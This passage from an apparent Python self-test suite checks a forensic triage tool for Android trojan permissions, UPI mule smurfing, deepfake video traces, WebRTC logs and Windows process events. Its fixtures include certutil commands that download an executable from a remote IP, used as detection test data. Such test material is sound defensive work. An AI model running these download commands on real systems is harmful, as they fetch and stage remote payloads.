           b'<package name="com.challan.update" codePath="/data/app/x" installer="">\n'
           b'  <perms><item name="android.permission.BIND_ACCESSIBILITY_SERVICE" granted="true"/></perms>\n'
           b'</package>\n<package name="com.sms.otp.helper" codePath="/data/app/y">\n'
           b'  <perms><item name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" granted="true"/></perms>\n'
           b'</package>\n</packages>\n')
    o = SutraNeuralTriageOrchestrator(output_dir=workdir)
    o.add_artifact("pk", "packages_xml", "ANDROID_PACKAGES_XML", data=xml)
    lm = o.run(write=False)["symbolic_anchors"]
    spans = {l["lead_details"]["package"]: l["symbolic_anchor"] for l in lm}
    check("A-01 packages.xml leads anchor their own <package> element",
          len(spans) == 2 and len({a["sha256"] for a in spans.values()}) == 2
          and all(xml[a["byte_offset"]:a["byte_offset"] + a["length"]].startswith(b"<package")
                  and xml[a["byte_offset"]:a["byte_offset"] + a["length"]].endswith(b"</package>") for a in spans.values()))

    # A-02 smurfing across two bank CSVs: every row anchored in its own artifact
    hdr = "txn_id,rrn,timestamp_utc,payer_vpa,payee_vpa,amount_inr,payee_ifsc\n"
    csv_a = (hdr + "A1,628711000101,2026-10-14T06:15:00Z,victim@okhdfc,hub@ybl,200000,YESB0000001\n"
             "A2,628711000199,2026-10-14T06:15:05Z,someone@ybl,other@ybl,500,YESB0000009\n").encode()
    csv_b = (hdr + "".join(f"B{i},62871100020{i},2026-10-14T06:15:{10 + 10 * i}Z,hub@ybl,m{i}@ybl,49000,YESB000010{i}\n"
                           for i in range(1, 5))).encode()
    o = SutraNeuralTriageOrchestrator(output_dir=workdir)
    o.add_artifact("hdfc", "upi_csv", "UPI_TRANSACTION_EXPORT", data=csv_a)
    o.add_artifact("yes", "upi_csv", "UPI_TRANSACTION_EXPORT", data=csv_b)
    sm = [l for l in o.run(write=False)["symbolic_anchors"] if l["threat_category"] == "RAPID_UPI_SMURFING"]
    rows = sm[0]["lead_details"]["row_anchors"] if sm else []
    src = {"hdfc": csv_a, "yes": csv_b}
    check("A-02 smurfing keeps a per-row anchor in each bank's CSV, no unrelated rows",
          len(sm) == 1 and len(rows) == 5 and {r["artifact_id"] for r in rows} == {"hdfc", "yes"}
          and all(src[r["artifact_id"]][r["byte_offset"]:r["byte_offset"] + r["length"]].count(b"\n") == 0
                  and SutraNeuralTriageOrchestrator.verify_anchor(r, src[r["artifact_id"]]) for r in rows)
          and not any(b"A2," in src[r["artifact_id"]][r["byte_offset"]:r["byte_offset"] + r["length"]] for r in rows))

    # A-02b NaN/Inf never reach canonical JSON
    try:
        canonical_json({"neural": _r(float("nan")), "inf": _r(float("inf"))})
        nan_ok = _r(float("nan")) is None
    except ValueError:
        nan_ok = False
    check("A-02b NaN/Inf scores serialise as null", nan_ok)

    # A-03 Section 45 checklist
    tgt = {"EventID": 1, "UtcTime": "2026-10-14 06:00:00.000", "Image": "C:\\Windows\\System32\\certutil.exe",
           "CommandLine": "certutil -urlcache -split -f http://x/a a", "ParentImage": "C:\\Windows\\explorer.exe",
           "User": "VICTIM-PC\\rahul", "LogonType": 2}
    clear_after = [{"EventID": 1102, "UtcTime": "2026-10-14 06:00:01.000"}]
    c = log.section45_exculpatory_checklist(dict(tgt), clear_after, device_owner="rahul")
    rmap = {r["check"]: r["result"] for r in c["checks"]}
    check("A-03a log cleared 1 s after the command is caught (C10)",
          rmap["C10_NO_LOG_CLEARING"] == "SUPPORTS_INTRUSION_HYPOTHESIS")
    check("A-03b HOST\\user matches the device owner (C06)", rmap["C06_USER_IS_DEVICE_OWNER"] == "SUPPORTS_ATTRIBUTION")
    tree = [
        {"EventID": 1, "UtcTime": "2026-10-14 05:50:00.000", "Image": "C:\\Program Files\\AnyDesk\\AnyDesk.exe",
         "ProcessId": 100, "ParentProcessId": 4},
        {"EventID": 1, "UtcTime": "2026-10-14 05:59:00.000", "Image": "C:\\Windows\\System32\\cmd.exe",
         "ProcessId": 200, "ParentProcessId": 100, "ParentImage": "C:\\Program Files\\AnyDesk\\AnyDesk.exe"},
    ]
    t2 = dict(tgt, ParentImage="C:\\Windows\\System32\\cmd.exe", ParentProcessId=200, ProcessId=300)
    c2 = log.section45_exculpatory_checklist(t2, tree, device_owner="rahul")
    r2 = {r["check"]: r["result"] for r in c2["checks"]}
    check("A-03c PascalCase AnyDesk.exe -> cmd.exe -> certutil fails C02 and C13",
          r2["C02_NO_REMOTE_TOOL_PROCESS"] == "SUPPORTS_INTRUSION_HYPOTHESIS"
          and r2["C13_DESKTOP_LINEAGE"] == "SUPPORTS_INTRUSION_HYPOTHESIS" and c2["remote_ancestor"] == "anydesk.exe",
          " -> ".join(c2["process_lineage"]))

    # B-01 rPPG robustness
    jaw, fore, red = _synthetic_rppg(0.025)
    bad = [media.analyze_rppg(jaw, fore, 0.0)["verdict"], media.analyze_rppg(jaw, fore, float("nan"))["verdict"],
           media.analyze_rppg(jaw, [90.0] * len(fore), 30.0)["verdict"],
           media.analyze_rppg([v - 95 for v in jaw], fore, 30.0)["verdict"], media.analyze_rppg(jaw[:10], fore[:10], 30.0)["verdict"]]
    check("B-01a bad fps, flat forehead, dark frames and short traces are INDETERMINATE",
          all(v.startswith("INDETERMINATE") for v in bad), ", ".join(bad))
    jaw, fore, _ = _synthetic_rppg(-0.025)
    rev = media.analyze_rppg(jaw, fore, 30.0)
    check("B-01b forehead leading jaw (reversed transit) becomes a lead",
          rev["verdict"] == "REVERSED_PULSE_TRANSIT" and rev["threat_score"] >= LEAD_THRESHOLD, f"{rev['ptt_delay_ms']} ms")
    fps, n = 30.0, 360
    rng = random.Random(5)
    jumps = [0.19 if (i // 120) % 2 == 0 else 0.19 + 2.6 for i in range(n)]
    jaw = [100 + math.sin(2 * math.pi * 1.2 * i / fps) + 0.02 * rng.uniform(-1, 1) for i in range(n)]
    fore = [90 + math.sin(2 * math.pi * 1.2 * i / fps - jumps[i]) + 0.02 * rng.uniform(-1, 1) for i in range(n)]
    jit = media.analyze_rppg(jaw, fore, fps)
    check("B-01c phase jumps between sub-windows flagged", jit["verdict"] == "TEMPORAL_PHASE_DISCONTINUITY",
          f"jitter {jit['subwindow_phase_jitter_rad']} rad")

    # B-02 spectral analysis
    flat = media.analyze_spectrum([[128] * 32 for _ in range(32)])
    tiny = media.analyze_spectrum([[1, 2], [3, 4]])
    check("B-02a flat and tiny frames return INDETERMINATE instead of raising",
          flat["verdict"].startswith("INDETERMINATE") and tiny["verdict"].startswith("INDETERMINATE"))
    nat = _synthetic_image(0.0, n=64, seed=9)
    q = DeepfakeTriageEngine.qp_step(42)
    comp = [row[:] for row in nat]
    for by in range(0, 64, 8):
        for bx in range(0, 64, 8):
            blk = [r[bx:bx + 8] for r in nat[by:by + 8]]
            co = dct2(blk)
            co = [[(math.copysign(math.floor(abs(v) / q + 1 / 6), v) * q) for v in row] for row in co]
            rec = idct2(co)
            for y in range(8):
                comp[by + y][bx:bx + 8] = [max(0.0, min(255.0, round(v))) for v in rec[y]]
    cr = media.analyze_spectrum(comp, qp=42)
    check("B-02b heavily quantised (QP 42) natural frame is not called generative",
          cr["verdict"] == "NATURAL_SPECTRAL_DECAY" and media.estimate_qp(comp) > media.estimate_qp(nat),
          f"alpha {cr['spectral_alpha']}, peak {cr['nyquist_peak_excess_ratio']}, zone {cr['hf_energy_excess_ratio']}, "
          f"QP-hat {media.estimate_qp(comp):.1f}")
    big = media.analyze_spectrum([[(x * y) % 251 for x in range(400)] for y in range(300)])
    check("B-02c large frames are centre-cropped to MAX_DCT_DIM", big["block_size"] == media.MAX_DCT_DIM)

    # B-03 WebRTC parser
    v6 = (b"2026-10-14 11:40:02.912 LL_I voip/ice: remote candidate: candidate:7 1 UDP 1677729535 "
          b"[2401:4900:1c2a:5::17] 3478 typ srflx raddr fe80::1%wlan0 rport 50998\n"
          b"2026-10-14 11:40:03.000 LL_I voip/ice: remote candidate: candidate:8 1 ssltcp 1677729535 "
          b"49.36.121.77 443 typ srflx\n"
          b"2026-13-45 99:99:99.000 LL_I garbage line candidate:9 1 udp 1 10.0.0.1 1 typ host\n")
    pv = media.parse_whatsapp_log(v6)
    tg = media.requisition_targets(pv)
    check("B-03a bracketed IPv6 with zone id and SSLTCP srflx candidates parsed",
          [(t["ip"], t["transport"]) for t in tg] == [("2401:4900:1c2a:5::17", "UDP"), ("49.36.121.77", "SSLTCP")]
          and pv["candidates"][0]["related_address"] == "fe80::1")
    broken = gzip.compress(v6)[:40]
    pb = media.parse_whatsapp_log(broken)
    check("B-03b truncated .gz and malformed timestamps are reported, not raised",
          pb["errors"] and any("timestamp" in e for e in pv["errors"]))

    # C-01 RRN rollovers and reserved STAN
    ist = datetime.timezone(datetime.timedelta(minutes=330))
    ny = datetime.datetime(2027, 1, 1, 0, 0, 2, tzinfo=ist).timestamp()
    leap = datetime.datetime(2024, 12, 31, 10, 5, tzinfo=ist).timestamp()
    v1 = fin.validate_rrn("636523123456", ny)        # 2026 day 365 hour 23, settled 00:00:02 on 1 Jan 2027
    v2 = fin.validate_rrn("436610123456", leap)      # day 366 of leap year 2024
    v3 = fin.validate_rrn("628711000000")
    check("C-01 midnight/year-end and leap-day RRNs valid; STAN 000000 rejected",
          v1["valid"] and v2["valid"] and not v3["valid"], f"{v1['reasons']} {v2['reasons']} {v3['reasons']}")

    # C-02 smurfing: no double counting, split inflows pooled
    def txn(i, sec, payer, payee, amt):
        return {"txn_id": f"S{i}", "rrn": f"6287060001{i:02d}", "epoch": 1792000000.0 + sec,
                "timestamp_utc": iso_utc(1792000000 + sec), "payer_vpa": payer, "payee_vpa": payee,
                "amount_inr": amt, "payee_ifsc": "YESB0000001"}
    outs = [txn(10 + k, 20 + 10 * k, "hub@ybl", f"m{k}@ybl", 49000) for k in range(4)]
    dbl = fin.detect_smurfing([txn(1, 0, "v1@okhdfc", "hub@ybl", 200000), txn(2, 10, "v2@okhdfc", "hub@ybl", 200000)] + outs)
    split = fin.detect_smurfing([txn(1, 0, "v1@okhdfc", "hub@ybl", 100000), txn(2, 0, "v2@okicici", "hub@ybl", 100000)] + outs)
    check("C-02 one alert per set of outflows; split inflows pooled",
          len(dbl) == 1 and len(split) == 1 and len(split[0]["pooled_inflows"]) == 1 and split[0]["dispersion_ratio"] == 0.98)

    # C-03 hawala false positives
    fp = b"INV-34K712946 ORD/12A123456 34K712946@ybl IMG_34K712946.jpg Invoice no: 22K345678 34I712946 34K000000"
    check("C-03 invoice/order/filename/VPA tokens, I/O insets and 000000 not counted",
          fin.extract_hawala_tokens(fp) == [] and len(fin.extract_hawala_tokens(b"handover note 34K 712946.")) == 1)

    # C-04 bridge skew and naive IST
    usdt = round(95000.0 / (84.0 * 1.05), 2)
    skew = fin.match_bridges([{"rrn": "1", "epoch": 1792000000.0, "amount_inr": 95000.0}],
                             [{"tx_hash": "0xs", "epoch": 1791999995.0, "amount_usdt": usdt}])
    naive = fin.match_bridges([{"rrn": "2", "epoch": 1792000000.0 + 19800, "amount_inr": 95000.0, "tz_naive": True}],
                              [{"tx_hash": "0xn", "epoch": 1792000060.0, "amount_usdt": usdt}])
    check("C-04 -5 s clock skew and naive-IST bank timestamps still match",
          len(skew) == 1 and len(naive) == 1 and naive[0]["timestamp_basis"] == "NAIVE_TIMESTAMP_READ_AS_IST")

    # D-01 overlay false positives and out-of-order offsets
    us = (b'time="2026-10-14 11:52:10.300" type=MOVE_TO_FOREGROUND package=com.challan.update class=.Overlay\n'
          b'time="2026-10-14 11:52:10.100" type=MOVE_TO_FOREGROUND package=com.sbi.lotusintouch class=.Login\n'
          b'time="2026-10-14 11:53:00.000" type=MOVE_TO_FOREGROUND package=com.snapwork.hdfc class=.Main\n'
          b'time="2026-10-14 11:53:00.150" type=MOVE_TO_FOREGROUND package=com.samsung.android.biometrics.app.setting class=.Prompt\n'
          b'time="2026-10-14 11:53:00.200" type=MOVE_TO_FOREGROUND package=com.google.android.gms class=.Auth\n')
    ev = apk.parse_usagestats(us)
    hits = apk.detect_overlay_attacks(ev, {"com.challan.update"})
    o = SutraNeuralTriageOrchestrator(output_dir=workdir)
    o.add_artifact("us", "usagestats", "ANDROID_USAGESTATS", data=us)
    om = o.run(write=False)
    check("D-01 biometric/GMS prompts ignored; out-of-order lines anchor without error",
          [h["overlay_package"] for h in hits] == ["com.challan.update"] and om["artifact_errors"] == []
          and all(l["symbolic_anchor"]["length"] > 0 for l in om["symbolic_anchors"]))

    # D-02 bounded APK scanning on a large file
    big_apk = os.path.join(workdir, "big_polyglot.apk")
    with open(big_apk, "wb") as f:
        f.write(_synthetic_apk(prefix=b"\xff\xd8\xff\xe0" + bytes(60) + b"\xff\xd9"))
        f.write(bytes(9 * 1024 * 1024))
        f.write(b"dex\n035\x00" + bytes(64))
    reads: List[int] = []
    size = os.path.getsize(big_apk)
    with open(big_apk, "rb") as fh:
        def read_at(off_: int, n_: int) -> bytes:
            reads.append(n_)
            fh.seek(off_)
            return fh.read(n_)
        res = apk.analyze_apk_source(read_at, size)
    names = {f_["finding"] for f_ in res["findings"]}
    check("D-02 9 MB trailer scanned in bounded chunks; DEX still found",
          {"JPEG_ZIP_POLYGLOT", "HIDDEN_DEX_IN_TRAILER_SLACK"} <= names
          and max(reads) <= apk.HEAD_SCAN + 64, f"largest read {max(reads)} of {size} bytes")
    os.remove(big_apk)

    # E-01 exact offsets with emoji (UTF-16LE) and invalid UTF-8
    u16 = b"\xff\xfe" + "hi \U0001F600 note 34K712946".encode("utf-16-le")
    u8 = b"bad \x80\xff byte, note 34K712946 \xe2\x82\xac"
    ok16 = [t for t in fin.extract_hawala_tokens(u16)]
    ok8 = [t for t in fin.extract_hawala_tokens(u8)]
    check("E-01a emoji in UTF-16LE and invalid UTF-8 bytes keep offsets exact",
          ok16 and u16[ok16[0]["byte_offset"]:ok16[0]["byte_offset"] + ok16[0]["length"]].decode("utf-16-le") == "34K712946"
          and ok8 and u8[ok8[0]["byte_offset"]:ok8[0]["byte_offset"] + ok8[0]["length"]] == b"34K712946")
    bad_csv = (hdr + "N1,628711000101,2026-10-14T06:15:00Z,a@ybl,b@ybl,nan,YESB0000001\n"
               "N2,628711000102,not-a-time,a@ybl,b@ybl,100,YESB0000001\n").encode()
    o = SutraNeuralTriageOrchestrator(output_dir=workdir)
    o.add_artifact("bad", "upi_csv", "UPI_TRANSACTION_EXPORT", data=bad_csv)
    o.add_artifact("trunc", "rppg_trace", "VIDEO_CALL_ROI_TRACE", data=RPPG_MAGIC + b"\x01\x00")
    bm = o.run(write=False)
    canonical_json(bm)
    check("E-01b NaN amounts, bad times and truncated traces are logged as artifact errors",
          len(bm["artifact_errors"]) >= 3 and bm["symbolic_anchors"] == [],
          f"{len(bm['artifact_errors'])} errors recorded")
    return out


def _safe_console(*streams: Any) -> None:
    """
    Console output can never abort the self-test: a stream whose encoding is not UTF-8 (a cp1252 /
    cp437 Windows console, output redirected to a file under a legacy code page, PYTHONIOENCODING=ascii)
    writes characters it cannot encode as backslash escapes instead of raising UnicodeEncodeError.
    """
    for s in streams or (sys.stdout, sys.stderr):
        if s is None or not hasattr(s, "reconfigure"):
            continue
        try:
            if codecs.lookup(getattr(s, "encoding", None) or "ascii").name == "utf-8":
                continue
        except LookupError:
            pass
        try:
            s.reconfigure(errors="backslashreplace")
        except (ValueError, OSError, AttributeError):
            pass


def _overnight_regressions(workdir: str, image: str, layout: Dict[str, Tuple[int, int]],
                           a_manifest_path: Optional[str]) -> List[Tuple[str, bool]]:
    """
    One check per finding of the 2026-10-21 overnight audit (B-F01 .. B-F26 and the cross-sector
    B-* items; B-01 is checked with B-F21 and B-S45-01 with B-F23), plus console safety. A check that
    raises counts as failed, so this group also runs (and fails) against the unfixed module.
    """
    out: List[Tuple[str, bool]] = []
    rdir = os.path.join(workdir, "overnight")
    os.makedirs(rdir, exist_ok=True)
    case = "FIR-042/2026-CYBER"
    hdr = "txn_id,rrn,timestamp_utc,payer_vpa,payee_vpa,amount_inr,payee_ifsc\n"
    bundle = _build_case_bundle()
    V = SutraNeuralTriageOrchestrator.verify_anchor

    def check(name: str, fn: Any) -> None:
        try:
            res = fn()
            ok, detail = res if isinstance(res, tuple) else (res, "")
            ok = bool(ok)
        except Exception as exc:  # a regression that raises is a failed check, not a crashed self-test
            ok, detail = False, f"raised {type(exc).__name__}: {exc}"[:160]
        out.append((name, ok))
        print(f"  [{'PASS' if ok else 'FAIL'}] O{len(out):02d} {name}" + (f"  ({detail})" if detail else ""))

    def run_data(owner: Optional[str] = "rahul", **arts: Tuple[str, bytes]) -> Dict[str, Any]:
        o = SutraNeuralTriageOrchestrator(case, output_dir=rdir, device_owner=owner)
        for aid, (kind, data) in arts.items():
            o.add_artifact(aid, kind, "TEST_" + kind.upper(), data=data)
        m = o.run(write=False)
        canonical_json(m)   # the manifest must always be hashable
        return m

    def cats(m: Dict[str, Any]) -> List[str]:
        return sorted(l["threat_category"] for l in m["symbolic_anchors"])

    def lead(m: Dict[str, Any], cat: str) -> Dict[str, Any]:
        return next(l for l in m["symbolic_anchors"] if l["threat_category"] == cat)

    def peak_bytes(fn: Any) -> Tuple[Any, int]:
        tracemalloc.start()
        try:
            res = fn()
            return res, tracemalloc.get_traced_memory()[1]
        finally:
            tracemalloc.stop()

    print("\nOvernight audit regressions")

    def f01():   # year-9999 UPI rows
        got = []
        for ts in ("9999-12-31T20:00:00Z", "9999-06-01T00:00:00Z"):
            m = run_data(upi=("upi_csv", (hdr + "T1,628711000101,2026-10-14T06:15:00Z,a@ybl,b@ybl,100,YESB0000001\n"
                                          f"T2,028711000102,{ts},a@ybl,c@ybl,100,YESB0000001\n").encode()))
            got.append(cats(m))
        v = FinancialMuleDetector().validate_rrn("028711000102", parse_timestamp("9999-06-01T00:00:00Z"))
        return got == [["INVALID_NPCI_RRN"]] * 2 and v["valid"] is False, f"{got}, {v['reasons'][:1]}"
    check("B-F01 UPI rows dated in year 9999 give an RRN finding, not a crashed run", f01)

    def f02():   # year-0001 WhatsApp line
        line = (b"0001-01-01 05:30:00.000 LL_I voip/ice: remote candidate: candidate:8 1 udp 1677729535 "
                b"49.36.121.77 3478 typ srflx\n")
        m = run_data(wa=("whatsapp_log", line))
        st = lead(m, "WEBRTC_PEER_ENDPOINT")["statutory_actions"]
        y1 = iso_utc(-62135596800.0)
        return (y1 == "0001-01-01T00:00:00.000Z" and st["requisition"]["query_window_utc"] is None
                and st["bnss_sec_94_requisition_ready"] is False), f"iso_utc(year 1) = {y1}"
    check("B-F02 a year-0001 WhatsApp line: 4-digit ISO year, Sec 94 window None, no crash", f02)

    def f03():   # NaN / Infinity / 1e999 / lone surrogate in JSONL
        cmd = '"command_line":"certutil.exe -urlcache -split -f http://185.220.101.5/a.exe a{}.exe"'
        base = '{{"event_id":1,"timestamp":{},"image":"certutil.exe",' + cmd + '{}}}'
        lines = [base.format('"2026-10-14T06:10:05Z"', "", ',"logon_type":NaN'),
                 base.format("1e999", "", ""),
                 base.format('"2026-10-14T06:10:06Z"', "", ',"host":Infinity'),
                 base.format('"2026-10-14T06:10:07Z"', "\\ud800", "")]
        m = run_data(ev=("process_events_jsonl", ("\n".join(lines) + "\n").encode()))
        n_err = len(m["artifact_errors"])
        return n_err == 3 and cats(m) == ["LOLBINS_COMMAND"], f"{n_err} non-finite lines reported, surrogate line kept"
    check("B-F03 NaN/Infinity/1e999/lone surrogate in JSONL are reported, manifest still hashes", f03)

    def f04():   # registered file missing at run time
        d = os.path.join(rdir, "f04")
        os.makedirs(d, exist_ok=True)
        p_chat, p_upi = os.path.join(d, "chat.txt"), os.path.join(d, "upi.csv")
        for p, k in ((p_chat, "chat"), (p_upi, "upi")):
            with open(p, "wb") as f:
                f.write(bundle[k])
        o = SutraNeuralTriageOrchestrator(case, output_dir=d)
        o.add_artifact("chat", "chat_transcript", "CHAT", path=p_chat)
        o.add_artifact("upi", "upi_csv", "UPI", path=p_upi)
        os.remove(p_chat)
        m = o.run(write=False)
        arts = {a["artifact_id"]: a for a in m["artifacts"]}
        return (arts["chat"].get("sha256") is None and arts["chat"].get("status") == "UNREADABLE"
                and arts["upi"].get("status") == "OK" and "RAPID_UPI_SMURFING" in cats(m)
                and any(e["artifact_id"] == "chat" and e["error"].startswith("UNREADABLE") for e in m["artifact_errors"]))
    check("B-F04 a registered file deleted before run(): UNREADABLE tripwire, manifest still written", f04)

    def f05():   # extents validated, truncation is a tripwire
        p = os.path.join(rdir, "f05.img")
        with open(p, "wb") as f:
            f.write(bundle["apk"] + bytes(100))
        size = os.path.getsize(p)
        rejected = []
        for bo, ln in ((0, size + 1), (0, -1), (size + 10, None), (-5, 10)):
            try:
                SutraNeuralTriageOrchestrator(case, output_dir=rdir).add_artifact(
                    "x", "apk", "APK", path=p, base_offset=bo, length=ln)
                rejected.append(False)
            except ValueError:
                rejected.append(True)
        o = SutraNeuralTriageOrchestrator(case, output_dir=rdir)
        o.add_artifact("apk", "apk", "ANDROID_APK_FILE", path=p, base_offset=0, length=len(bundle["apk"]))
        with open(p, "r+b") as f:
            f.truncate(100)
        m = o.run(write=False)
        a = m["artifacts"][0]
        return (all(rejected) and a.get("sha256") is None and a.get("status") == "TRUNCATED" and not m["symbolic_anchors"]
                and any("TRUNCATED" in e["error"] for e in m["artifact_errors"])), f"bad extents rejected {rejected}"
    check("B-F05 out-of-file / negative extents rejected; a truncated image is TRUNCATED, not re-hashed short", f05)

    def f06():   # msgstore.db URI with '#', '%' and a UNC-style path
        d = os.path.join(rdir, "FIR #42 50%")
        os.makedirs(d, exist_ok=True)
        db = os.path.join(d, "msgstore.db")
        if os.path.exists(db):
            os.remove(db)
        con = sqlite3.connect(db)
        con.execute("CREATE TABLE call_log (_id INTEGER, call_id TEXT, timestamp INTEGER, duration INTEGER)")
        con.execute("INSERT INTO call_log VALUES (1, 'wrtc_call_99182', 1792000000000, 600)")
        con.commit()
        con.close()
        before = sorted(os.listdir(rdir))
        rows = DeepfakeTriageEngine.parse_msgstore_calls(db)
        if os.name == "nt":
            unc = DeepfakeTriageEngine.msgstore_uri("\\\\nas\\cases\\FIR #42\\msgstore.db") == \
                "file:////nas/cases/FIR%20%2342/msgstore.db?mode=ro&immutable=1"
        else:
            unc = len(DeepfakeTriageEngine.parse_msgstore_calls("/" + os.path.abspath(db))) == 1
        return ([r.get("call_id") for r in rows] == ["wrtc_call_99182"] and unc
                and sorted(os.listdir(rdir)) == before), "no stray database created"
    check("B-F06 msgstore.db in 'FIR #42 50%' opens read-only (percent-encoded URI); UNC-style path works", f06)

    def f07():   # one out-of-range row must not discard the export
        m = run_data(upi=("upi_csv", bundle["upi"] + b"T8,628711000108,9999-12-31T23:59:59-05:00,x@ybl,y@ybl,10.00,"
                                                    b"YESB0000001\n"))
        errs = [e["error"] for e in m["artifact_errors"]]
        return "RAPID_UPI_SMURFING" in cats(m) and len(errs) == 1, errs[0] if errs else "no error"
    check("B-F07 one year-10000 UPI row is one row error; the rest of the export keeps its leads", f07)

    def f08():   # non-string Image / ParentImage, deep nesting
        ev = bundle["events"]
        bad = [json.dumps({"event_id": 1, "timestamp": "2026-10-14T06:09:00Z", "command_line": "whoami", "image": 4242}),
               json.dumps({"event_id": 1, "timestamp": "2026-10-14T06:09:01Z", "command_line": "whoami",
                           "ParentImage": {"x": 1}}),
               json.dumps({"event_id": 4624, "timestamp": "2026-10-14T06:00:00Z", "logon_type": 3, "image": ["a"]}),
               "[" * 200000]
        m = run_data(ev=("process_events_jsonl", ev + ("\n".join(bad) + "\n").encode()))
        n_log, n_s45 = cats(m).count("LOLBINS_COMMAND"), m["summary_metrics"]["exculpatory_checks_evaluated"]
        return (n_log == 2 and n_s45 == 14 and len(m["artifact_errors"]) == 1), \
            f"{n_log} log leads, {n_s45} Sec 45 checks, {len(m['artifact_errors'])} error(s)"
    check("B-F08 events with numeric/list/object Image fields keep the log's leads and the Sec 45 screen", f08)

    def f09():   # one flipped bit in a JSONL line is reported
        ev = bytearray(bundle["events"])
        i = ev.rstrip(b"\n").rindex(b"\n") + 1
        ev[i] ^= 1
        m = run_data(ev=("process_events_jsonl", bytes(ev)))
        errs = [e["error"] for e in m["artifact_errors"]]
        return any(f"byte {i}" in e for e in errs), errs[0] if errs else "no error recorded"
    check("B-F09 a corrupted JSONL line is listed in artifact_errors, not silently dropped", f09)

    def f10():   # BOM-marked UTF-8 and UTF-16LE exports
        ev = bundle["events"]
        res = []
        for data in (ev, b"\xef\xbb\xbf" + ev, b"\xff\xfe" + ev.decode().encode("utf-16-le")):
            m = run_data(ev=("process_events_jsonl", data))
            res.append((cats(m), m["summary_metrics"]["total_telemetry_events_scanned"],
                        all(V(l["symbolic_anchor"], data) for l in m["symbolic_anchors"])))
        br = bundle["bugreport"]
        dump = br[br.index(b"Packages:"):br.index(b"------ DUMP OF SERVICE settings")]
        md = run_data(d=("dumpsys_package", b"\xff\xfe" + dump.decode().encode("utf-16-le")))
        return (res[0] == res[1] == res[2] and res[0][1] == 4 and res[0][2]
                and cats(md).count("ANDROID_TROJAN_CAPABILITY") == 2), \
            f"events scanned UTF-8/BOM/UTF-16LE {[r[1] for r in res]}, anchors re-hash {[r[2] for r in res]}"
    check("B-F10 UTF-8-BOM and UTF-16LE (PowerShell 5.1) exports parse with exact anchors", f10)

    def f11():   # Sector A binding is verified
        if _sector_a is None or not a_manifest_path:
            return True, "Sector A not beside this file: binding left UNVERIFIED by design"
        with open(a_manifest_path, "r", encoding="utf-8") as f:
            am = json.load(f)
        bad = json.loads(json.dumps(am))
        bad["cryptographic_hashes"]["sha256_linear_primary"] = "0" * 64
        try:
            SutraNeuralTriageOrchestrator(case, output_dir=rdir).bind_sector_a_manifest(bad)
            refused = False
        except ValueError:
            refused = True
        d = os.path.join(rdir, "f11")
        os.makedirs(d, exist_ok=True)
        flipped = os.path.join(d, os.path.basename(image))
        with open(image, "rb") as f:
            blob = bytearray(f.read())
        i = blob.index(b"34K 712946")
        blob[i + 4] ^= 1     # '7' -> '6': one bit flipped after Sector A vaulted the image
        with open(flipped, "wb") as f:
            f.write(blob)
        got = []
        for src in (image, flipped):
            o = SutraNeuralTriageOrchestrator(case, output_dir=d)
            o.bind_sector_a_manifest(a_manifest_path)
            off, ln = layout["chat"]
            o.add_artifact("chat", "chat_transcript", "CHAT_TRANSCRIPT_TEXT", path=src, base_offset=off, length=ln,
                           extent=True)
            m = o.run(write=False)
            got.append((m["sector_a_binding"].get("manifest_digest"), m["sector_a_binding"].get("image_digest"),
                        any(e["error"].startswith("INTEGRITY_FAILURE") for e in m["artifact_errors"])))
        return (refused and got[0] == ("VERIFIED", "VERIFIED", False)
                and got[1] == ("VERIFIED", "MISMATCH", True)), f"edited A manifest refused: {refused}; {got}"
    check("B-F11 edited Sector A manifest refused; image bit-flip after vaulting is an INTEGRITY_FAILURE", f11)

    def f12():   # naive-IST bank timestamps and RRN validation
        def rrn_cats(col: str, rrn: str, ts: str) -> List[str]:
            csv_ = f"txn_id,rrn,{col},payer_vpa,payee_vpa,amount_inr,payee_ifsc\nT1,{rrn},{ts},r@okhdfc,s@ybl,2500,YESB0000001\n"
            return cats(run_data(upi=("upi_csv", csv_.encode())))
        genuine = [rrn_cats("timestamp", "628711000101", "2026-10-14 11:45:00"),
                   rrn_cats("timestamp_utc", "628711000101", "2026-10-14 11:45:00"),
                   rrn_cats("timestamp_utc", "628711000101", "2026-10-14T06:15:00Z")]
        wrong_hour = rrn_cats("timestamp", "628702000101", "2026-10-14 11:45:00")
        return genuine == [[], [], []] and wrong_hour == ["INVALID_NPCI_RRN"], f"genuine {genuine}, wrong hour {wrong_hour}"
    check("B-F12 genuine RRNs in naive-IST exports are valid; a wrong RRN hour is still flagged", f12)

    def f13():   # '+0530' basic-format offsets, identical on 3.10 and 3.11+
        lines = bundle["upi"].decode().splitlines()
        rows = [lines[0]]
        for ln in lines[1:]:
            f_ = ln.split(",")
            local = _utc_like(parse_timestamp(f_[2]) + 19800)
            f_[2] = local + "+0530"
            rows.append(",".join(f_))
        m = run_data(upi=("upi_csv", ("\n".join(rows) + "\n").encode()))
        same = parse_timestamp("2026-10-14T11:45:00+0530") == parse_timestamp("2026-10-14T06:15:00Z") == \
            parse_timestamp("2026-10-14T06:15:00.000-0000")
        return same and "RAPID_UPI_SMURFING" in cats(m) and not m["artifact_errors"], f"Python {sys.version.split()[0]}"
    check("B-F13 '+0530' offsets parse (Python 3.10 too), so the VM and Windows agree", f13)

    def f14():   # decode_text_with_offsets memory
        text = ("[14/10/26 12:05] Handler: payment done \u20b9 500, ok \U0001F44D\n" * 20000) + "note 34K 712946\n"
        data = text.encode()
        (txt, to_byte), peak = peak_bytes(lambda: decode_text_with_offsets(data))
        idx = [0, 1, 37, 4095, 70001, len(txt) - 5, len(txt)]
        exact = all(to_byte(i) == len(txt[:i].encode("utf-8")) for i in idx)
        tok = FinancialMuleDetector.extract_hawala_tokens(data)
        return (peak < 10 * len(data) and exact and len(tok) == 1
                and data[tok[0]["byte_offset"]:tok[0]["byte_offset"] + tok[0]["length"]] == b"34K 712946"), \
            f"peak {peak / len(data):.1f}x a {len(data) >> 10} KB emoji chat"
    check("B-F14 emoji chat export: offset map no longer costs a Python int per character", f14)

    def f15():   # whole-artifact parsing memory
        data = (b"x" * 63 + b"\n") * (128 * 1024)                    # 8 MB of lines
        _, peak = peak_bytes(lambda: next(iter_lines(data)))
        o = SutraNeuralTriageOrchestrator(case, output_dir=rdir)
        o.add_artifact("a", "chat_transcript", "T", data=b"a" * 10)
        o.add_artifact("b", "chat_transcript", "T", data=b"b" * 10)
        o._cache = {}
        o._load("a")
        o._load("b")
        return (peak < len(data) // 8 and list(o._cache) == ["b"] and o.MAX_INMEMORY_BYTES <= 64 * 1024 * 1024), \
